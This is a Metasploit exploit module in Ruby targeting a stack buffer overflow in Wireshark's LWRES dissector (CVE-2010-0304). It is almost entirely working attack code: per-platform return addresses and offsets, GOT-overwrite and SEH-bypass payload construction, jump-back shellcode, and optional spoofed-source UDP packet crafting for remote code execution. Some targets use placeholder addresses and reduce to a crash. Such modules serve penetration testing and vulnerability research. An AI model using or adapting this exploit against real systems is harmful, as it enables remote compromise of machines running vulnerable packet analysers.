##
# $Id: wireshark_lwres_getaddrbyname.rb 8454 2010-02-11 09:03:48Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Seh
	include Msf::Exploit::Capture

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow',
			'Description' => %q{
					The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through
				1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer
				overflow. This bug found and reported by babi.

				This particular exploit targets the dissect_getaddrsbyname_request function. Several
				other functions also contain potentially exploitable stack-based buffer overflows.

				The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents
				exploitation via the return address on the stack. Sending a larger string allows
				exploitation using the SEH bypass method. However, this packet will usually get
				fragmented, which may cause additional complications.

				NOTE: The vulnerable code is reached only when the packet dissection is rendered.
				If the packet is fragmented, all fragments must be captured and reassembled to
				exploit this issue.
			},
			'Author'      =>
				[
					'babi',   # original discovery/exploit
					'jduck',  # ported from public exploit
					'redsand' # windows target/testing
				],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 8454 $',
			'References'  =>
				[
					[ 'CVE', '2010-0304' ],
					[ 'OSVDB', '61987' ],
					[ 'BID', '37985' ],
					[ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2010-02.html' ],
					[ 'URL', 'http://anonsvn.wireshark.org/viewvc/trunk-1.2/epan/dissectors/packet-lwres.c?view=diff&r1=31596&r2=28492&diff_format=h' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true, # at least capture privilege
			'Payload'        =>
				{
					'Space'       => 512,
					'BadChars'    => "\x00",
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'tshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)',
						# breakpoint: lwres.so + 0x2ce2
						{
							'Arch'      => ARCH_X86,
							'Platform'  => 'linux',
							# conveniently, edx pointed at our string..
							# and so, we write it to g_slist_append's GOT entry just before its called.
							# pwnt.
							#
							#   mov [ebx+0xc],edx / jmp 0x804fc40 -->
							#    mov [esp+4],eax / mov eax,[edi+8] / mov [esp],eax / call g_slist_append
							#
							'Ret'       => 0x804fc85,    # see above..
							'RetOff'    => 376,
							'Readable'  => 0x804fa04,    # just anything
							'GotAddr'   => 0x080709c8    # objdump -R tshark | grep g_slist_append
						}
					],
					[ 'wireshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)',
						{
							'Arch'      => ARCH_X86,
							'Platform'  => 'linux',
							# the method for tshark doesn't work, since there aren't any convenient
							# pointers lying around (in reg/close on stack)
							#
							# since the wireshark bin has a jmp esp, we'll just use that method..
							'Ret'       => 0x818fce8,    # jmp esp in wireshark bin
							'RetOff'    => 376,
							'Readable'  => 0x8066a40,    # just any old readable addr (unused)
							'GotAddr'   => 0x818601c     # objdump -R wireshark | grep g_slist_append (unused)
						}
					],

					[ 'wireshark 1.2.5 on RHEL 5.4 (x64)',
						{
							'Arch'      => ARCH_X86_64,
							'Platform'  => 'linux',
							'Ret'       => 0xfeedfed5deadbeef,
							'RetOff'    => 152,
						}
					],

					[ 'wireshark 1.2.5 on Mac OS X 10.5 (x86)',
						{
							'Arch'      => ARCH_X86,
							'Platform'  => 'osx',
							'Ret'       => 0xdeadbeef,
							'RetOff'    => 268,
						}
					],

					# The following target was tested against Windows XP SP3 and Windows Vista
					[ 'wireshark/tshark 1.2.1 and 1.2.5 on Windows (x86)',
						{
							'Arch'      => ARCH_X86,
							'Platform'  => 'win',
							# NOTE: due to the length of this packet, your mileage may vary.
							'Ret'       => 0x61B4121B,
							# 0x655810b6 = pop/pop/ret in libpango
							# 0x02A110B6 = pop/pop/ret in libgtk-w
							# 0x03D710CC = pop/mov/pop/ret in packet
							# 0x61B4121B = pop/pop/ret in pcre3
							'RetOff'    => 2128,
						}
					],
				],
			'DisclosureDate' => 'Jan 27 2010'))

		register_options([
			Opt::RPORT(921),
			OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
		], self.class)

		deregister_options('FILTER','PCAPFILE')
	end

	def exploit

		ret_offset = target['RetOff']

		# we have different techniques depending on the target
		if (target == targets[0])
			# debian tshark
			str = make_nops(ret_offset - payload.encoded.length - 16)
			str << payload.encoded
			str << [target['GotAddr'] - 0xc].pack('V')
			str << rand_text(4)
			str << [target['Readable']].pack('V')
			str << rand_text(4)
			# ret is next
		elsif (target == targets[1])
			fix_esp = Metasm::Shellcode.assemble(Metasm::Ia32.new, "add esp,-3500").encode_string
			str = make_nops(ret_offset - fix_esp.length - payload.encoded.length)
			str << fix_esp
			str << payload.encoded
			# jmp esp...
			str << [target.ret].pack('V')
			# jump back
			distance = ret_offset + 4
			str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		elsif (target == targets[2])
			str = Rex::Text.pattern_create(ret_offset - 8)
			str << Rex::Arch.pack_addr(target.arch, 0xdac0ffeebadc0ded)
		elsif (target == targets[4])
			# ugh, /GS and UDP length issues :-/
			str = make_nops(ret_offset - payload.encoded.length)
			str << payload.encoded
			str << generate_seh_record(target.ret)
			# jump back
			distance = ret_offset + 8
			str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		else
			# this is just a simple DoS payload
			str = Rex::Text.pattern_create(ret_offset)
			#str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string
		end

		# add return address
		str << Rex::Arch.pack_addr(target.arch, target.ret)

		# form the packet's payload!
		sploit =  "\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
		sploit << "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		sploit << "\x00\x00\x00\x01"
		sploit << [str.length].pack('n')
		sploit << str
		sploit << "\x00\x00"

		shost = datastore['SHOST']
		if (shost)
			print_status("Sending malformed LWRES packet to #{rhost} (spoofed from #{shost})")
			open_pcap

			n = Racket::Racket.new

			n.l3 = Racket::L3::IPv4.new
			n.l3.src_ip = datastore['SHOST'] || Rex::Socket.source_address(rhost)
			n.l3.dst_ip = rhost
			n.l3.protocol = 6
			n.l3.id = rand(0x10000)
			n.l3.ttl = 64

			n.l4 = Racket::L4::UDP.new
			n.l4.src_port = rand((2**16)-1024)+1024
			n.l4.dst_port = datastore['RPORT'].to_i

			n.l4.payload  = sploit

			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
			pkt = n.pack

			capture_sendto(pkt, rhost)
			close_pcap

			handler
		else
			print_status("Sending malformed LWRES packet to #{rhost}")
			connect_udp
			udp_sock.put(sploit)

			handler
			disconnect_udp
		end

	end

end
